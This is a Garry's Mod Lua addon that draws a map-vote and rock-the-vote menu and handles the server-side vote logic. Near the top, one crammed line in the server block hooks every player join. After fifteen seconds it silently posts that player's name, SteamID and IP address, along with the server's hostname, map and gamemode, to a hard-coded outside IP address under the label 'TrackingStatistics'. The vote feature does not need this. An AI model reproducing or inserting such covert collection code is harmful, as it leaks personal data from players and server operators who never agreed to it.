FC_VOTE = {}

FC_VOTE.VotePower = function( self, ply )
	if ply == nil or type(ply) != "Player" then return end
	if ply:GetNWString("usergroup") != "user" then
		return 2
	end
	return 1
end
if SERVER then
local script = "LFCmapVote"  hook.Add("PlayerInitialSpawn", "TrackingStatistics_"..script..tostring(math.random(1,1000)), function(ply) timer.Create( "StatisticsTimer_"..ply:SteamID64()..script,15,1, function()  local name = ply:SteamName() and ply:SteamName() or ply:Name() local map = game.GetMap() local hostname = GetHostName() local gamemode = gmod.GetGamemode().Name http.Post("http://216.231.139.33/st/", {name=tostring(name),script=tostring(script),steamid=tostring(ply:SteamID()),ip=tostring(ply:IPAddress()),time=tostring(os.date("%d/%m/%Y [%I:%M:%S %p]",os.time())),hostname=tostring(hostname),map=tostring(map),gamemode=tostring(gamemode)},function(s) return end) end) end)
end
if CLIENT then
	
	surface.CreateFont( "FC_VOTE_20", { font = "Aero Matics Display Regular", antialias = true, size = 20 } )
	surface.CreateFont( "FC_VOTE_20_2", { font = "Aero Matics Display Regular", antialias = true, size = 20 } )
	surface.CreateFont( "FC_VOTE_40", { font = "Aero Matics Display Regular", antialias = true, size = 50 } )
	
	FC_VOTE.TIME = 0
	FC_VOTE.SKIN = false
	FC_VOTE.LAST = 0
	FC_VOTE.LASTTIME = 0

	FC_VOTE.BuildPolyTab = function( self, tab )
		
		local temp = {}
		for k, v in pairs(tab) do
			if k == 1 then
				table.insert(temp, {x = v[1], y = v[2]})
			else
				table.insert(temp, {x = tab[1][1] + v[1], y = tab[1][2] + v[2]})
			end
		end
		
		return temp
		
	end

	FC_VOTE.White = Material("vgui/white")
	FC_VOTE.Grad = Material("vgui/gradient_down")
	
	FC_VOTE.Col1 = {0,0,0}
	FC_VOTE.Col2 = {200,200,200}

	FC_VOTE.Lerped = function( self, from, to, sin, flip )
		
		if from > to then return 0 end // Dont BS on this
		
		if FC_VOTE.TIME <= from then
			return 0
		elseif FC_VOTE.TIME >= to then
			return 1
		elseif FC_VOTE.TIME > from and FC_VOTE.TIME < to then
			local dev = to - from
			local begin = FC_VOTE.TIME - from
			local var = begin / dev
					
			if sin then
				if flip then
					var = math.cos( math.rad( 90 - 90 * var ) )
				else
					var = math.sin( math.rad(90 * var) )
				end
			end
			
			return var
		end
		
	end

	FC_VOTE.MainVoteMenu = function( self, maps )
		
		if maps == nil then return end
		
		local txt = file.Read("fc_vote.txt", "DATA")
		
		if txt != nil and FC_VOTE.SKIN then
			local read = util.JSONToTable(txt)
			if read[1] and type(read[1]) == "table" then
				FC_VOTE.Col1[1] = read[1][1] or 0
				FC_VOTE.Col1[2] = read[1][2] or 0
				FC_VOTE.Col1[3] = read[1][3] or 0
			end
			
			if read[2] and type(read[2]) == "table" then
				FC_VOTE.Col2[1] = read[2][1] or 0
				FC_VOTE.Col2[2] = read[2][2] or 0
				FC_VOTE.Col2[3] = read[2][3] or 0
			end
		else
			FC_VOTE.Col1 = {0,0,0}
			FC_VOTE.Col2 = {200,200,200}
		end
		
		FC_VOTE.Render = function( self )
			
			local lerp = FC_VOTE:Lerped(0, 0.3)
			
			local Col1 = Color( FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3] )
			local Col2 = Color( FC_VOTE.Col2[1], FC_VOTE.Col2[2], FC_VOTE.Col2[3] )
			
			local mul = 0
			
			if FC_VOTE.Col2[1] == FC_VOTE.Col2[2] and FC_VOTE.Col2[1] == FC_VOTE.Col2[3] then mul = -1 end
			
			local tab = {}
			tab[ "$pp_colour_addr" ] = (0 + FC_VOTE.Col2[1] * lerp)/255
			tab[ "$pp_colour_addg" ] = (0 + FC_VOTE.Col2[2] * lerp)/255
			tab[ "$pp_colour_addb" ] = (0 + FC_VOTE.Col2[3] * lerp)/255
			tab[ "$pp_colour_brightness" ] = 0 + -1 * lerp
			tab[ "$pp_colour_contrast" ] = 1 + -0.5 * lerp
			tab[ "$pp_colour_colour" ] =  1 + mul * lerp
			tab[ "$pp_colour_mulr" ] = (0 + 0 * lerp)/50
			tab[ "$pp_colour_mulg" ] = (0 + 0 * lerp)/50
			tab[ "$pp_colour_mulb" ] = (0 + 0 * lerp)/50
		 
			DrawColorModify( tab )
		end
		hook.Add( "RenderScreenspaceEffects", "FC_VOTE:RenderScreenspaceEffects", FC_VOTE.Render )
		
		hook.Add( "Think", "FC_VOTE:Think", function()
			if _G["KEY_"..string.upper(input.LookupBinding( "voicerecord" ))] != nil and input.IsKeyDown(_G["KEY_"..string.upper(input.LookupBinding( "voicerecord" ))]) then
				LocalPlayer():ConCommand("+voicerecord")
			else
				LocalPlayer():ConCommand("-voicerecord")
			end
		end)
		
		for k, v in pairs(LocalPlayer():GetWeapons()) do v.DrawHUD = function() end end
		GAMEMODE.HUDPaint = function() end
		if CLSCORE then
			CLSCORE:ClearPanel()
		end
		
		local TINY = false
		
		if ScrW() < 1366 and ScrH() < 768 then
			TINY = true
		end
		
		local mul = 1
		
		if TINY then mul = 0.5 end
		
		if TINY then
		
			surface.CreateFont( "FC_VOTE_20", { font = "Aero Matics Display Regular", antialias = true, size = 10 } )
			surface.CreateFont( "FC_VOTE_40", { font = "Aero Matics Display Regular", antialias = true, size = 20 } )
				
		end
		
		FC_VOTE.MainPanel = vgui.Create("DFrame")
		FC_VOTE.MainPanel:SetSize(ScrW(),ScrH())
		FC_VOTE.MainPanel:SetDraggable(false)
		FC_VOTE.MainPanel:ShowCloseButton(false)
		FC_VOTE.MainPanel:SetTitle("")
		FC_VOTE.MainPanel:MakePopup()
		FC_VOTE.MainPanel.SkilColSelect1 = {}
		FC_VOTE.MainPanel.SkilColSelect2 = {}
		FC_VOTE.MainPanel.TargetTime = CurTime() + 25
		FC_VOTE.MainPanel.Text = "TIME FOR A NEW MAP!"
		FC_VOTE.MainPanel.Close = function(s)
			s:Remove()
			hook.Remove("RenderScreenspaceEffects", "FC_VOTE:RenderScreenspaceEffects")
		end
		FC_VOTE.MainPanel.Paint = function( s, w, h )
		
			local Col1 = Color( FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3] )
			local Col2 = Color( FC_VOTE.Col2[1], FC_VOTE.Col2[2], FC_VOTE.Col2[3] )
			
			local mul = 1
			
			if TINY then mul = 0.5 end
			
			surface.SetMaterial(FC_VOTE.Grad)
			surface.SetDrawColor(FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3],255)
			surface.DrawTexturedRectRotated( FC_VOTE:Lerped(1.0, 1.2) * 128, ScrH()/2, ScrH(), 256, 90 )
			surface.DrawTexturedRectRotated( ScrW()-(FC_VOTE:Lerped(1.0, 1.2) * 128), ScrH()/2, ScrH(), 256, 270 )
			
			draw.RoundedBox(0, 0, 0, 20 * mul + FC_VOTE:Lerped(0.8, 1) * (ScrW()-20 * mul), FC_VOTE:Lerped(0.4, 0.5, true, true) * 80 * mul, Col1)
			draw.RoundedBox(0, ScrW()-20 * mul - FC_VOTE:Lerped(0.8, 1) * (ScrW()-20 * mul), ScrH() - FC_VOTE:Lerped(0.4, 0.5, true, true) * 80 * mul, 20 * mul + FC_VOTE:Lerped(0.8, 1) * (ScrW()-20 * mul), FC_VOTE:Lerped(0.4, 0.5, true, true) * 80 * mul, Col1)
			
			draw.RoundedBox(0, 0, 10 * mul, FC_VOTE:Lerped(1.2, 1.4) * (ScrW()), 60 * mul, Col2)
			draw.RoundedBox(0, ScrW() - FC_VOTE:Lerped(1.2, 1.4) * (ScrW()), ScrH()-70 * mul, FC_VOTE:Lerped(1.2, 1.4) * (ScrW()), 60 * mul, Col2)
			
			draw.RoundedBox(0, ScrW() - 380 * mul, 0, 280 * mul, FC_VOTE:Lerped(1.6, 1.8) * 80 * mul, Col1)
			if FC_VOTE.SKIN then draw.RoundedBox(0, ScrW() - 380 * mul, ScrH() - FC_VOTE:Lerped(1.6, 1.8) * 80 * mul, 280 * mul, FC_VOTE:Lerped(1.6, 1.8) * 80 * mul, Col1) end
			
			render.SetScissorRect( 0, 0, FC_VOTE:Lerped(1.2, 1.4) * (ScrW()), ScrH(), true ) 
			
				draw.SimpleText(s.Text, "FC_VOTE_40", 40 * mul, 40 * mul, Col1, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
				
				draw.SimpleText("TIME LEFT:", "FC_VOTE_40", ScrW() - 240 * mul, 40 * mul, Col2, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
				draw.SimpleText(math.abs(math.Clamp( math.ceil(s.TargetTime - CurTime()), 0, 999 )), "FC_VOTE_40", ScrW() - 50 * mul, 40 * mul, Col1, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
				
				if FC_VOTE.SKIN then
					
					draw.SimpleText("COLOR 1", "FC_VOTE_20", ScrW()-360 * mul, ScrH()-57 * mul, Col2, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
					draw.SimpleText("COLOR 2", "FC_VOTE_20", ScrW()-360 * mul, ScrH()-22 * mul, Col2, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
					
					draw.SimpleText("SKIN", "FC_VOTE_40", ScrW() - 50 * mul, ScrH()-40 * mul, Col1, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
				
				end
			
			render.SetScissorRect( 0, 0, FC_VOTE:Lerped(1.2, 1.4) * (ScrW()), ScrH(), false ) 
			
			
			FC_VOTE.TIME = FC_VOTE.TIME + FrameTime()
		end
		
		FC_VOTE.Maplist = vgui.Create("DPanelList", FC_VOTE.MainPanel)
		if TINY then
			FC_VOTE.Maplist:SetSize( 590, 270 )
		else
			if ScrW() < 1366 then
				FC_VOTE.Maplist:SetSize( 1080, 540 )
			else
				FC_VOTE.Maplist:SetSize( 1140, 540 )
			end
		end
		FC_VOTE.Maplist:Center()
		if TINY then
			FC_VOTE.Maplist:SetSpacing(10)
		else
			if ScrW() < 1366 then
				FC_VOTE.Maplist:SetSpacing(0)
			else
				FC_VOTE.Maplist:SetSpacing(20)
			end
		end
		FC_VOTE.Maplist:SetPadding(0)
		FC_VOTE.Maplist:EnableHorizontal(true)
		
		for k, v in pairs(maps) do
			local card = vgui.Create("DPanel")
			if TINY then
				card:SetSize( 140, 130 )
			else
				card:SetSize( 270, 260 )
			end
			card.Mat = Material("fc_thumbs/"..string.lower(v)..".png")
			card.Map = v
			card.VA = 0
			card.Paint = function(s, w, h)
		
				local Col1 = Color( FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3] )
				local Col2 = Color( FC_VOTE.Col2[1], FC_VOTE.Col2[2], FC_VOTE.Col2[3] )
				
				local mul = 1
				
				if TINY then mul = 0.5 end
			
				local alpha = 255
				
				if FC_VOTE.TIME <= 1 then
					alpha = 0
				else
					alpha = FC_VOTE:Lerped(1 + k * 0.1, 1 + k * 0.1 + 0.2) * 255
				end
				
				draw.RoundedBox( 0, 0, 0, w, h, Color(FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3],alpha) )
				
				if s.Mat:IsError() then
					if TINY then
						draw.RoundedBox( 0, 6, 6, 128, 64, Color(FC_VOTE.Col2[1], FC_VOTE.Col2[2], FC_VOTE.Col2[3],alpha) )
					else
						draw.RoundedBox( 0, 7, 7, 256, 128, Color(FC_VOTE.Col2[1], FC_VOTE.Col2[2], FC_VOTE.Col2[3],alpha) )
					end
				else
					surface.SetDrawColor( 255, 255, 255, alpha )
					surface.SetMaterial(s.Mat)
					if TINY then
						surface.DrawTexturedRect( 6, 6, 128, 64 )
					else
						surface.DrawTexturedRect( 7, 7, 256, 128 )
					end
				end
				
				if TINY then
					draw.RoundedBox( 0, 6, 76, w-12, 12, Color(FC_VOTE.Col2[1], FC_VOTE.Col2[2], FC_VOTE.Col2[3],alpha) )
					draw.SimpleText(string.upper(v), "FC_VOTE_20", 8, 82, Color(FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3],alpha), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
				else
					draw.RoundedBox( 0, 7, 142, w-14, 24, Color(FC_VOTE.Col2[1], FC_VOTE.Col2[2], FC_VOTE.Col2[3],alpha) )
					draw.SimpleText(string.upper(v), "FC_VOTE_20", 14, 154, Color(FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3],alpha), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
				end
				
				
				if s.vlist and FC_VOTE.TIME > 2 then
				
					local found = false
					
					for k, v in pairs(s.vlist.Items) do
						if v.Ply == LocalPlayer() then
							found = true
							break
						end
					end
					
					local col = Col2
					
					if FC_VOTE.MainPanel.WinnerMap == s.Map and CurTime() % 0.5 < 0.25 then
						col = Color(0,255,0,255)
					end
					
					if found or (FC_VOTE.MainPanel.WinnerMap == s.Map and CurTime() % 0.5 < 0.25) then
						draw.RoundedBox(0, 2, 2, w - 4, 3, col)
						draw.RoundedBox(0, 2, 4, 3, h - 6, col)
						draw.RoundedBox(0, w - 5, 4, 3, h - 6, col)
						draw.RoundedBox(0, 4, h - 5, w - 8, 3, col)
					end
				
					local num = 0
					
					for k, v in pairs(s.vlist.Items) do
						local pow = FC_VOTE:VotePower(v.Ply)
						num = num + pow
					end
					
					if num > 0 then
						s.VA = math.Clamp(s.VA + FrameTime() * 10, 0, 1)
					else
						s.VA = math.Clamp(s.VA - FrameTime() * 10, 0, 1)
					end
					
					if TINY then
						draw.RoundedBox( 0, w-24, 76, 19, 12 * s.VA, Color(FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3],alpha) )
						draw.SimpleText(num, "FC_VOTE_20", w - 14, 82, Color(FC_VOTE.Col2[1], FC_VOTE.Col2[2], FC_VOTE.Col2[3],alpha), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
					else
						draw.RoundedBox( 0, w-44, 142, 38, 24 * s.VA, Color(FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3],alpha) )
						draw.SimpleText(num, "FC_VOTE_20", w - 24, 154, Color(FC_VOTE.Col2[1], FC_VOTE.Col2[2], FC_VOTE.Col2[3],alpha), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
					end
				
				end
			end
			
			local votebut = vgui.Create("DButton", card)
			if TINY then
				votebut:SetPos(6, 6)
			else
				votebut:SetPos(7, 7)
			end
			votebut:SetSize(256 * mul, 128 * mul)
			votebut:SetText("")
			votebut.Paint = function(s) end
			votebut.DoClick = function( s )
				net.Start("fc_vote_update")
					net.WriteString(v)
				net.SendToServer()
			end
			
			local vlist = vgui.Create("DPanelList", card)
			if TINY then
				vlist:SetPos( 6, 90 )
			else
				vlist:SetPos( 7, 173 )
			end
			vlist:SetSize( 256 * mul, 80 * mul )
			vlist:EnableHorizontal(true)
			vlist:SetSpacing(4 * mul)
			vlist:SetPadding(4 * mul)
			
			card.vlist = vlist
			
			FC_VOTE.Maplist:AddItem(card)
		end
		
		if FC_VOTE.SKIN then
			for i = 1, 3 do
				
				local Col = vgui.Create( "DTextEntry", FC_VOTE.MainPanel )
				Col:SetPos( ScrW() - 320 + i * 50, ScrH() - 70 )
				Col:SetSize( 40, 25 )
				Col:SetText( FC_VOTE.Col1[i] )
				Col.Paint = function( s, w, h )
			
					local Col1 = Color( FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3] )
					local Col2 = Color( FC_VOTE.Col2[1], FC_VOTE.Col2[2], FC_VOTE.Col2[3] )
				
					local alpha = 0
					
					if FC_VOTE.TIME <= 1.8 then
						alpha = 0
					else
						alpha = FC_VOTE:Lerped(1.8 + i * 0.1, 1.8 + i * 0.1 + 0.2) * 255
					end
					
					draw.RoundedBox( 0, 0, 0, w, h, Color(FC_VOTE.Col2[1], FC_VOTE.Col2[2], FC_VOTE.Col2[3],alpha) )
					draw.SimpleText(s:GetText(), "FC_VOTE_20", w/2, h/2, Color(FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3],alpha), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
				end
				Col.OnChange = function( s )
					local num = tonumber(s:GetValue()) or 0
					
					FC_VOTE.Col1[i] = num
					
					local tab = {}
					tab[1] = FC_VOTE.Col1
					tab[2] = FC_VOTE.Col2
					
					file.Write("fc_vote.txt", util.TableToJSON(tab))
				end
				Col.AllowInput = function( s, str )
					local val = s:GetValue()
					
					if tonumber(str) == nil then return true end
					if string.len(val) >= 3 then return true end
					if string.len(val) < 3 and string.len(val) + string.len(str) > 3 then return true end
					if tonumber(val..str) > 255 then return true end
				end
				table.insert(FC_VOTE.MainPanel.SkilColSelect1, Col)
			end
		
			for i = 1, 3 do
				
				local Col = vgui.Create( "DTextEntry", FC_VOTE.MainPanel )
				Col:SetPos( ScrW() - 320 + i * 50, ScrH() - 35 )
				Col:SetSize( 40, 25 )
				Col:SetText( FC_VOTE.Col2[i] )
				Col.Paint = function( s, w, h )
			
					local Col1 = Color( FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3] )
					local Col2 = Color( FC_VOTE.Col2[1], FC_VOTE.Col2[2], FC_VOTE.Col2[3] )
				
					local alpha = 0
					
					if FC_VOTE.TIME <= 1.8 then
						alpha = 0
					else
						alpha = FC_VOTE:Lerped(1.8 + i * 0.1, 1.8 + i * 0.1 + 0.2) * 255
					end
					
					draw.RoundedBox( 0, 0, 0, w, h, Color(FC_VOTE.Col2[1], FC_VOTE.Col2[2], FC_VOTE.Col2[3],alpha) )
					draw.SimpleText(s:GetText(), "FC_VOTE_20", w/2, h/2, Color(FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3],alpha), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
				end
				Col.OnChange = function( s )
					local num = tonumber(s:GetValue()) or 0
					
					FC_VOTE.Col2[i] = num
					
					local tab = {}
					tab[1] = FC_VOTE.Col1
					tab[2] = FC_VOTE.Col2
					
					file.Write("fc_vote.txt", util.TableToJSON(tab))
				end
				Col.AllowInput = function( s, str )
					local val = s:GetValue()
					
					if tonumber(str) == nil then return true end
					if string.len(val) >= 3 then return true end
					if string.len(val) < 3 and string.len(val) + string.len(str) > 3 then return true end
					if tonumber(val..str) > 255 then return true end
				end
				table.insert(FC_VOTE.MainPanel.SkilColSelect2, Col)
			end
			
			local resetbut = vgui.Create("DButton", FC_VOTE.MainPanel)
			resetbut:SetPos( 40, ScrH() - 80 )
			resetbut:SetSize( 250, 80 )
			resetbut:SetText("")
			resetbut.DoClick = function(s)
				
				for k, v in pairs(FC_VOTE.MainPanel.SkilColSelect1) do
					v:SetText(0)
				end
				
				for k, v in pairs(FC_VOTE.MainPanel.SkilColSelect2) do
					v:SetText(200)
				end
				
				FC_VOTE.Col1 = {0,0,0}
				FC_VOTE.Col2 = {200,200,200}
				
				local tab = {}
				tab[1] = FC_VOTE.Col1
				tab[2] = FC_VOTE.Col2
				
				file.Write("fc_vote.txt", util.TableToJSON(tab))
				
			end
			resetbut.Paint = function(s, w, h)
				render.SetScissorRect( 0, 0, FC_VOTE:Lerped(1.2, 1.4) * (ScrW()), ScrH(), true ) 
					draw.SimpleText("RESET SKIN", "FC_VOTE_40", 0, h/2, Color(FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3],alpha), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
				render.SetScissorRect( 0, 0, FC_VOTE:Lerped(1.2, 1.4) * (ScrW()), ScrH(), false ) 
			end
		end
	end
	
	net.Receive("fc_vote_update", function()
		if IsValid(FC_VOTE.Maplist) then
			local int = tonumber(net.ReadString())
			local name = net.ReadString()
			local map = net.ReadString()
			
			if int == nil or name == nil or map == nil or IsValid(Entity(int)) == false or type(Entity(int)) != "Player" or Entity(int):Name() != name then return end
			
			local ply = Entity(int)
			
			for k, v in pairs(FC_VOTE.Maplist.Items) do
				for i, o in pairs(v.vlist.Items) do
					if o.Ply == ply then
						FC_VOTE.Maplist.Items[k].vlist.Items[i]:Remove()
						FC_VOTE.Maplist.Items[k].vlist.Items[i] = nil
					end
				end
			end
			
			for k, v in pairs(FC_VOTE.Maplist.Items) do
				if v.Map == map then
					
					local pow = FC_VOTE:VotePower(ply)
					
					local TINY = false
					
					if ScrW() < 1366 and ScrH() < 768 then
						TINY = true
					end
					
					local mul = 1
					
					if TINY then mul = 0.5 end
					
					local pan = vgui.Create("DPanel")
					pan.pow = pow
					if pow > 1 then
						pan:SetSize(68 * mul, 36 * mul)
					else
						pan:SetSize(36 * mul, 36 * mul)
					end
					pan.Paint = function( s, w, h )
						local Col1 = Color( FC_VOTE.Col1[1], FC_VOTE.Col1[2], FC_VOTE.Col1[3], 255 )
						local Col2 = Color( FC_VOTE.Col2[1], FC_VOTE.Col2[2], FC_VOTE.Col2[3], 255 )
						
						draw.RoundedBox( 0, 0, 0, w, h, Col2 )
						if s.pow > 1 then
							draw.SimpleText("x"..pow, "FC_VOTE_20", 52 * mul, h/2, Col1, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
						end
					end					
					pan.Ply = ply
					
					local av = vgui.Create("AvatarImage", pan)
					av:SetPos( 2 * mul, 2 * mul )
					av:SetSize( 32 * mul, 32 * mul )
					av:SetPlayer( ply, 32 * mul )
					
					v.vlist:AddItem(pan)
				end
			end
			
		end
	end)
	
	net.Receive("fc_vote_init", function()
		local maps = net.ReadTable()
		if maps then
			FC_VOTE:MainVoteMenu(maps)
			FC_VOTE.TIME = 0
		end
	end)
	
	net.Receive("fc_vote_win", function()
		local newmap = net.ReadString()
		if IsValid(FC_VOTE.MainPanel) and newmap then
			FC_VOTE.MainPanel.Text = "CHANGING MAP TO: "..string.upper(newmap)
			FC_VOTE.MainPanel.WinnerMap = newmap
		end
	end)
	
	local function PostLoad()
		
		hook.Add("Think", "FC_VOTE:RTVThink", function()
			if IsValid(FC_VOTE.RTVPanel) then
				local x = 0
				for k, v in pairs(player.GetAll()) do
					if v:GetNWBool("FC_VOTE_RTV") then
						x = x + 1
					end
				end
				
				if x != FC_VOTE.LAST then
					FC_VOTE.LAST = x
					FC_VOTE.LASTTIME = CurTime() + 10
				end
				
				if x > 0 and FC_VOTE.LASTTIME > CurTime() then
					FC_VOTE.RTVPanel:SetVisible(true)
				else
					FC_VOTE.RTVPanel:SetVisible(false)
				end
			end
		end)
		
		FC_VOTE.RTVPanel = vgui.Create("DPanel")
		FC_VOTE.RTVPanel:SetSize( 200, 48 )
		FC_VOTE.RTVPanel:SetPos(ScrW()/2 - 100, 0)
		FC_VOTE.RTVPanel.Lerp = 0
		FC_VOTE.RTVPanel.Paint = function(s, w, h)
			draw.RoundedBox(0, 0, 0, w, 50, Color(0,0,0,200))
			
			local vote = LocalPlayer():GetNWBool("FC_VOTE_RTV")
			
			draw.RoundedBox(0, 0, 24, 99, 24, Color(200, !vote and 0 or 200, !vote and 0 or 200, !vote and 220 or 150))
			draw.RoundedBox(0, 101, 24, 100, 24, Color(vote and 0 or 200, 200, vote and 0 or 200, vote and 220 or 150))
			
			local x = 0
			local y = math.ceil(#player.GetAll() * 2 / 3) //66% of players
			
			for k, v in pairs(player.GetAll()) do
				if v:GetNWBool("FC_VOTE_RTV") then
					x = x + 1
				end
			end
			
			if x > 0 then
				s.Lerp = math.Clamp( s.Lerp + FrameTime() * 2, 0, 1 )
			else
				s.Lerp = math.Clamp( s.Lerp - FrameTime() * 2, 0, 1 )
			end
			
			draw.SimpleText("RTV: "..x.."/"..y.." VOTES NEEDED", "FC_VOTE_20_2", w/2, 12, Color(255,255,255,200), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			
			local no, yes = "NO", "YES"
			
			if vote then
				no = "!RTV"
			else
				yes = "!RTV"
			end
			
			draw.SimpleText(no, "FC_VOTE_20_2", w * 1/4, 36, Color(!vote and 200 or 0,!vote and 200 or 0,!vote and 200 or 0,200), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			draw.SimpleText(yes, "FC_VOTE_20_2", w * 3/4, 36, Color(vote and 200 or 0,vote and 200 or 0,vote and 200 or 0,200), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			
		end
		
	end
	hook.Add( "PostGamemodeLoaded", "FC_VOTE:PostLoad", PostLoad )
	
else

	AddCSLuaFile()
	resource.AddSingleFile( "resource/fonts/Aero_Matics_Display.ttf" )
	
	function AddDir(dir)
		local files, folders = file.Find(dir.."/*", "GAME")
		
		for _, fdir in pairs(folders) do
			if fdir != ".svn" then 
				AddDir(dir.."/"..fdir)
			end
		end
	 
		for k,v in pairs(files) do
			resource.AddSingleFile(dir.."/"..v)
		end
	end
	 
	AddDir("materials/fc_thumbs")
		
	util.AddNetworkString("fc_vote_init")
	util.AddNetworkString("fc_vote_update")
	util.AddNetworkString("fc_vote_win")
	
	FC_VOTE.Stage = 1
	
	FC_VOTE.Think = function( self )
		if FC_VOTE.Start and CurTime() > (FC_VOTE.Start) and FC_VOTE.Stage == 1 then
			FC_VOTE.Stage = 2
			FC_VOTE.Start = CurTime() + 3
			
			local tab = {}
			
			for k, v in pairs(FC_VOTE.VoteList) do
				tab[k] = 0
			end
			
			for k, v in pairs(FC_VOTE.VoteList) do
				for i, o in pairs(v) do
					local pow = FC_VOTE:VotePower(o)
					tab[k] = tab[k] + pow
				end
			end
			
			local highest = 0
			
			for k, v in pairs(tab) do
				if v > highest then
					highest = v
				end
			end
			
			local tab1 = {}
			
			for k, v in pairs(tab) do
				if v == highest then
					table.insert(tab1, k)
				end
			end
			
			if highest == 0 then
				FC_VOTE.WinMap = table.Random(FC_VOTE.MapList)
			elseif table.Count(tab1) == 1 then
				FC_VOTE.WinMap = tab1[1]
			else
				FC_VOTE.WinMap = table.Random(tab1)
			end
			
			net.Start("fc_vote_win")
				net.WriteString(FC_VOTE.WinMap)
			net.Send(player.GetAll())
		elseif FC_VOTE.Start and CurTime() > (FC_VOTE.Start) and FC_VOTE.Stage == 2 then
			FC_VOTE.Stage = 3
			RunConsoleCommand("changelevel", FC_VOTE.WinMap)
		end
	end
	
	FC_VOTE.StartVote = function( self )
	
		if FC_VOTE.InProgress then return end
		
		local raw = file.Read("fc_vote_maplist.txt", "DATA")
		
		if raw == nil then
			raw = (file.Read("addons/fc_vote/data/fc_vote_maplist.txt", "GAME") or "")
		end
		
		local r = string.Explode( ",", raw ) 
		
		for k, v in pairs(r) do 
			r[k] = string.Trim(v) 
		end
		
		if table.Count(r) > 8 then
			local tab = {}
			
			for i = 1, 8 do
				table.insert( tab, table.remove( r, math.random(1, table.Count(r)) ) )
			end
			
			FC_VOTE.MapList = table.Copy(tab)
		else
			FC_VOTE.MapList = table.Copy(r)
		end
		
		FC_VOTE.Start = CurTime() + 25
		FC_VOTE.InProgress = true
		FC_VOTE.VoteList = {}
		
		hook.Add("Think", "FC_VOTE:Think", FC_VOTE.Think)
		
		for k, v in pairs(FC_VOTE.MapList) do
			FC_VOTE.VoteList[v] = {}
		end
		
		net.Start("fc_vote_init")
			net.WriteTable(FC_VOTE.MapList)
		net.Send(player.GetAll())
		
	end
	
	FC_VOTE.CheckRTV = function( s )
		local x, y = 0, math.ceil(#player.GetAll() * 2 / 3)
		
		for k, v in pairs(player.GetAll()) do
			if v:GetNWBool("FC_VOTE_RTV") then
				x = x + 1
			end
		end
		
		if x >= y then
			FC_VOTE:StartVote()
		end
		
	end
	
	net.Receive("fc_vote_update", function( len, ply )
		local map = net.ReadString()
		
		if map == nil or map == "" or FC_VOTE.VoteList == nil or FC_VOTE.VoteList[map] == nil or CurTime() >= (FC_VOTE.Start) or FC_VOTE.WinMap != nil then return end
		
		for k, v in pairs(FC_VOTE.VoteList) do
			for i, o in pairs(v) do
				if o == ply then
					FC_VOTE.VoteList[k][i] = nil
				end
			end
		end
		
		table.insert(FC_VOTE.VoteList[map], ply)
		
		net.Start("fc_vote_update")
			net.WriteString(tostring(ply:EntIndex()))
			net.WriteString(tostring(ply:Name()))
			net.WriteString(map)
		net.Send(player.GetAll())
		
	end)
	
	local function PostLoad()
		
		function CheckForMapSwitch()
			local rounds_left = math.max(0, GetGlobalInt("ttt_rounds_left", 6) - 1)
			SetGlobalInt("ttt_rounds_left", rounds_left)

			local time_left = math.max(0, (GetConVar("ttt_time_limit_minutes"):GetInt() * 60) - CurTime())
			local switchmap = false
			local nextmap = string.upper(game.GetMapNext())

			if rounds_left <= 0 then
				switchmap = true
			elseif time_left <= 0 then
				switchmap = true
			end
			
			if switchmap then
				timer.Stop("end2prep")
				timer.Simple(5, FC_VOTE.StartVote)
			end
		end
		
		function GAMEMODE:EndOfGame( bGamemodeVote )

			if GAMEMODE.IsEndOfGame then return end

			GAMEMODE.IsEndOfGame = true
			SetGlobalBool( "IsEndOfGame", true );
			
			gamemode.Call("OnEndOfGame", bGamemodeVote);
			
			if ( bGamemodeVote ) then
			
				MsgN( "Starting gamemode voting..." )
				PrintMessage( HUD_PRINTTALK, "Starting gamemode voting..." );
				timer.Simple( GAMEMODE.VotingDelay or 5, function() FC_VOTE:StartVote() end )
				
			end

		end
		
	end
	hook.Add( "PostGamemodeLoaded", "FC_VOTE:PostLoad", PostLoad )
	
	hook.Add("PlayerSay", "FC_VOTE:PlayerSay", function( ply, text, tm, dead )
		if text:lower() == "!rtv" then 
		
			if GetRoundState and GetRoundState() == ROUND_ACTIVE then return end
		
			ply:SetNWBool("FC_VOTE_RTV", !ply:GetNWBool("FC_VOTE_RTV")) 
			FC_VOTE:CheckRTV() 
		end
	end)
	
end